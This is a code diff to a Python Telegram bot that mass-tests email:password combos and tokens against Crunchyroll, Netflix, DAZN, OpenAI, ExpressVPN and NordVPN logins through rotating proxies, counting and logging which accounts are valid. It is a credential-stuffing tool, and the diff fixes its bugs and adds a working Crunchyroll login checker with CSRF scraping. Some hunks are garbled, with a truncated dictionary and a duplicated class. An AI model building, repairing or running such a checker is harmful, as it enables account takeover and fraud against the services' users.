@@ -46,7 +46,7 @@ logging.basicConfig(
     datefmt="%d-%b-%Y %H:%M:%S",
     level=logging.INFO
 )
-logger = logging.getLogger(name)
+logger = logging.getLogger(__name__)
 
 # ============================================
 # DATABASE INITIALIZATION
@@ -116,7 +116,7 @@ async def get_db():
 # PROXY MANAGER
 # ============================================
 class ProxyManager:
-    def init(self):
+    def __init__(self):
         self._cache = []
         self._cache_time = 0
         self._cache_ttl = 60
@@ -205,111 +205,41 @@ class ProxyManager:
 # ============================================
 # SERVICE CHECKERS
 # ============================================
-class CheckerEngine:
-    def __init__(self, proxy_manager: ProxyManager):
-        self.proxy_manager = proxy_manager
-        self.services = {
-            "crunchyroll": {"checker": ServiceCheckers.check_crunchyroll, "type": "email:pass", "label": "🍿 Crunchyroll"},
-            "netflix": {"checker": ServiceCheckers.check_netflix_token, "type": "token", "label": "📺 Netflix"},
-            "dazn": {"checker": ServiceCheckers.check_dazn, "type": "email:pass", "label": "⚽ DAZN"},
-            "openai": {"checker": ServiceCheckers.check_openai_token, "type": "token", "label": "🧠 OpenAI"},
-            "expressvpn": {"checker": ServiceCheckers.check_expressvpn, "type": "email:pass", "label": "🔒 ExpressVPN"},
-            "nordvpn": {"checker": ServiceCheckers.check_nordvpn, "type": "email:pass", "label": "🔐 NordVPN"},
-        }
-        self.semaphore = asyncio.Semaphore(30)
-        self.stats = {"total": 0, "valid": 0, "invalid": 0, "errors": 0, "by_service": {}}
-    
-    def _parse_credential(self, cred: str) -> Dict:
-        cred = cred.strip()
-        if ":" in cred and "@" in cred:
-            parts = cred.split(":", 1)
-            return {"email": parts[0].strip(), "password": parts[1].strip()}
-        elif cred.startswith("ey") or len(cred) > 30:
-            return {"token": cred}
-        else:
-            return {"raw": cred}
-    
-    async def check_single(self, service: str, credential: str, use_proxy: bool = True, user_id: int = 0, chat_id: int = 0) -> Dict:
-        async with self.semaphore:
-            proxy = await self.proxy_manager.get_proxy() if use_proxy else None
-            service_info = self.services.get(service)
-            if not service_info:
-                return {"valid": False, "status": "unknown_service"}
-            
-            checker = service_info["checker"]
-            parsed = self._parse_credential(credential)
-            
-            try:
-                result = await checker(**parsed, proxy=proxy)
-                if proxy:
-                    await self.proxy_manager.report_result(proxy, result.get("valid", False))
-                self._update_stats(service, result.get("valid", False))
-                await self._log_check(user_id, chat_id, service, credential[:50], result.get("valid", False), result.get("status", "unknown"), json.dumps(result), proxy)
-                result["proxy_used"] = proxy
-                return result
-            except Exception as e:
-                self.stats["errors"] += 1
-                await self._log_check(user_id, chat_id, service, credential[:50], False, "error", json.dumps({"error": str(e)}), proxy)
-                return {"valid": False, "status": "error", "error": str(e)}
-    
-    async def check_batch(self, service: str, credentials: List[str], use_proxy: bool = True, user_id: int = 0, chat_id: int = 0, max_workers: int = 20) -> List[Dict]:
-        sem = asyncio.Semaphore(max_workers)
-        async def limited_check(cred):
-            async with sem:
-                return await self.check_single(service, cred, use_proxy, user_id, chat_id)
-        
-        tasks = [limited_check(cred) for cred in credentials]
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        processed = []
-        for r in results:
-            if isinstance(r, Exception):
-                processed.append({"valid": False, "status": "error", "error": str(r)})
-            else:
-                processed.append(r)
-        return processed
-    
-    async def _log_check(self, user_id, chat_id, service, credential, valid, status, data, proxy):
+class ServiceCheckers:
+    @staticmethod
+    async def check_crunchyroll(email: str, password: str, proxy: Optional[str] = None) -> Dict:
         try:
-            async with get_db() as db:
-                await db.execute(
-                    "INSERT INTO checks (user_id, chat_id, service, credential, valid, status, data, proxy_used) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
-                    (user_id, chat_id, service, credential, valid, status, data, proxy or "")
-                )
-                await db.execute(
-                    "INSERT OR REPLACE INTO users (user_id) VALUES (?)",
-                    (user_id,)
-                )
-                await db.commit()
+            async with aiohttp.ClientSession() as session:
+                async with session.get(
+                    "https://www.crunchyroll.com/",
+                    proxy=proxy,
+                    timeout=aiohttp.ClientTimeout(total=10)
+                ) as resp:
+                    html = await resp.text()
+                    csrf_match = re.search(r'csrf_token["\s:]+"([^"]+)"', html)
+                    csrf = csrf_match.group(1) if csrf_match else ""
+                
+                async with session.post(
+                    "https://www.crunchyroll.com/login",
+                    data={"email": email, "password": password, "csrf_token": csrf},
+                    proxy=proxy,
+                    allow_redirects=False,
+                    timeout=aiohttp.ClientTimeout(total=10)
+                ) as resp:
+                    if resp.status == 302:
+                        return {"valid": True, "status": "active", "tier": "premium"}
+                    return {"valid": False, "status": "invalid"}
         except Exception as e:
-            logger.error(f"Failed to log check: {e}")
+            return {"valid": False, "status": "error", "error": str(e)}
     
-    def _update_stats(self, service: str, valid: bool):
-        self.stats["total"] += 1
-        if valid:
-            self.stats["valid"] += 1
-        else:
-            self.stats["invalid"] += 1
-        if service not in self.stats["by_service"]:
-            self.stats["by_service"][service] = {"total": 0, "valid": 0}
-        self.stats["by_service"][service]["total"] += 1
-        if valid:
-            self.stats["by_service"][service]["valid"] += 1
-    
-    def get_stats(self) -> Dict:
-        return self.stats
-
-# ============================================
-# CHECKER ENGINE
-# ============================================
-class CheckerEngine:
-    def init(self, proxy_manager: ProxyManager):
-        self.proxy_manager = proxy_manager
-        self.services = {
-            "crunchyroll": {"checker": ServiceCheckers.check_crunchyroll, "type": "email:pass", "label": "🍿 Crunchyroll"},
-            "netflix": {"checker": ServiceCheckers.check_netflix_token, "type"
+    @staticmethod
+    async def check_netflix_token(token: str, proxy: Optional[str] = None) -> Dict:
+        try:
+            async with aiohttp.ClientSession() as session:
+                headers = {
                     "Authorization": f"Bearer {token}",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-                       }
+                }
                 async with session.get(
                     "https://www.netflix.com/api/shakti/viper/metadata",
                     headers=headers,
@@ -598,8 +528,8 @@ async def handle_service_selection(update: Update, context: ContextTypes.DEFAULT
     await query.edit_message_text(
         f"🔍 *Checking {label}*\n\n"
         f"Send credentials (one per line):\n"
-        f"• {cred_type}\n"
-        f"• Or upload a .txt file\n\n"
+        f"• `{cred_type}`\n"
+        f"• Or upload a `.txt` file\n\n"
         f"🌐 Proxy: {'✅ ON' if context.user_data.get('use_proxy', True) else '❌ OFF'}",
         parse_mode=ParseMode.MARKDOWN,
         reply_markup=InlineKeyboardMarkup([
@@ -680,10 +610,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     summary = f"""
 📊 *Check Complete*
-Service: {service}
-Total: {len(results)}
-✅ Valid: {len(valid)}
-❌ Invalid: {len(invalid)}
+Service: `{service}`
+Total: `{len(results)}`
+✅ Valid: `{len(valid)}`
+❌ Invalid: `{len(invalid)}`
 """
     await update.message.reply_text(summary, parse_mode=ParseMode.MARKDOWN)
     await status_msg.delete()
@@ -777,10 +707,10 @@ async def show_stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
     
     text = f"""
 📊 *Statistics*
-Total: {stats['total']}
-✅ Valid: {stats['valid']}
-❌ Invalid: {stats['invalid']}
-🌐 Proxies: {proxy_stats['alive']}/{proxy_stats['total']}
+Total: `{stats['total']}`
+✅ Valid: `{stats['valid']}`
+❌ Invalid: `{stats['invalid']}`
+🌐 Proxies: `{proxy_stats['alive']}/{proxy_stats['total']}`
 """
     await query.edit_message_text(
         text,
@@ -793,7 +723,7 @@ Total: {stats['total']}
 # ============================================
 # FLASK APP FOR RENDER WEB SERVICE
 # ============================================
-flask_app = Flask(name)
+flask_app = Flask(__name__)
 
 @flask_app.route('/')
 def health():
@@ -842,7 +772,7 @@ def main():
     
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
-if name == "main":
+if __name__ == "__main__":
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
     time.sleep(2)
